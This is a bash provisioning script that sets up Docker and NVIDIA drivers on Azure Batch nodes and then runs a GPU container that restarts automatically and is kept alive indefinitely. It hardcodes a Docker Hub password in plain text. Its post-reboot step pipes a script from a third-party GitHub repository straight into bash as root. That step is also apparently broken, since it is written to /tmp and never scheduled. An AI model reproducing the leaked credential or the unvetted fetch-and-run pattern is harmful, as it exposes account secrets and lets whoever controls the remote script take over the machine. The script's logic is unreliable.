#!/bin/bash
# Azure Batch NVIDIA Setup - SIMPLE VERSION

set -e

# Configuration
IMAGE="docker.io/riccorg/ai2pytochcpugpu:latest"
CONTAINER_NAME="ai-trainer"
DOCKER_USERNAME="riccorg"
DOCKER_PASSWORD="UL3bJ_5dDcPF7s#"

# Log
LOG="/var/log/batch-setup.log"
echo "=== START $(date) ===" > "$LOG"

# Function to load NVIDIA modules
load_nvidia_modules() {
    echo "Loading NVIDIA kernel modules..." | tee -a "$LOG"
    
    # Try to load main NVIDIA module
    if sudo modprobe nvidia 2>/dev/null; then
        echo "nvidia module loaded" | tee -a "$LOG"
        
        # Load supporting modules
        for module in nvidia_uvm nvidia_drm nvidia_modeset; do
            sudo modprobe $module 2>/dev/null && echo "$module loaded" | tee -a "$LOG"
        done
        
        # Check if nvidia-smi works
        sleep 2
        if nvidia-smi > /dev/null 2>&1; then
            echo "✅ NVIDIA drivers working" | tee -a "$LOG"
            return 0
        fi
    fi
    
    echo "❌ Could not load NVIDIA modules" | tee -a "$LOG"
    return 1
}

# Main setup
echo "Updating system..." | tee -a "$LOG"
apt-get update -y >> "$LOG" 2>&1

# Install Docker
if ! command -v docker > /dev/null; then
    echo "Installing Docker..." | tee -a "$LOG"
    apt-get install -y docker.io >> "$LOG" 2>&1
    systemctl start docker
    systemctl enable docker
fi

# Docker login
echo "Docker login..." | tee -a "$LOG"
echo "$DOCKER_PASSWORD" | docker login docker.io --username "$DOCKER_USERNAME" --password-stdin >> "$LOG" 2>&1 || true

# Check for NVIDIA GPU
if lspci | grep -i nvidia > /dev/null; then
    echo "NVIDIA GPU detected" | tee -a "$LOG"
    
    # First try loading existing drivers
    if ! load_nvidia_modules; then
        echo "Installing NVIDIA drivers..." | tee -a "$LOG"
        
        # Install drivers
        apt-get install -y ubuntu-drivers-common >> "$LOG" 2>&1
        ubuntu-drivers autoinstall >> "$LOG" 2>&1
        
        echo "Drivers installed. Rebooting..." | tee -a "$LOG"
        
        # Create post-reboot script
        cat > /tmp/after-reboot.sh << 'EOF'
#!/bin/bash
sleep 20
curl -s https://raw.githubusercontent.com/max313iq/Ssl/refs/heads/main/docker_nvidia_install.sh | bash -s continue
EOF
        chmod +x /tmp/after-reboot.sh
        
        # Reboot immediately
        shutdown -r now
        exit 0
    fi
    
    # If we get here, NVIDIA is working
    echo "Setting up NVIDIA container toolkit..." | tee -a "$LOG"
    
    # Simple NVIDIA toolkit install
    DISTRO=$(lsb_release -is | tr '[:upper:]' '[:lower:]')
    VERSION=$(lsb_release -rs)
    ARCH=$(dpkg --print-architecture)
    
    curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey 2>/dev/null | \
        gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg 2>/dev/null || true
    
    echo "deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://nvidia.github.io/libnvidia-container/stable/${DISTRO}${VERSION}/${ARCH} /" \
        > /etc/apt/sources.list.d/nvidia-container-toolkit.list 2>/dev/null
    
    apt-get update -y >> "$LOG" 2>&1
    apt-get install -y nvidia-container-toolkit >> "$LOG" 2>&1 || true
    nvidia-ctk runtime configure --runtime=docker >> "$LOG" 2>&1 || true
    systemctl restart docker >> "$LOG" 2>&1
fi

# Pull and run container
echo "Starting container..." | tee -a "$LOG"
docker pull "$IMAGE" >> "$LOG" 2>&1 || true
docker stop "$CONTAINER_NAME" 2>/dev/null || true
docker rm "$CONTAINER_NAME" 2>/dev/null || true

if nvidia-smi 2>/dev/null; then
    docker run -d --gpus all --restart unless-stopped --name "$CONTAINER_NAME" "$IMAGE" >> "$LOG" 2>&1
    echo "Container started with GPU" | tee -a "$LOG"
else
    docker run -d --restart unless-stopped --name "$CONTAINER_NAME" "$IMAGE" >> "$LOG" 2>&1
    echo "Container started without GPU" | tee -a "$LOG"
fi

echo "✅ Setup complete" | tee -a "$LOG"

# Keep alive
while true; do sleep 3600; done
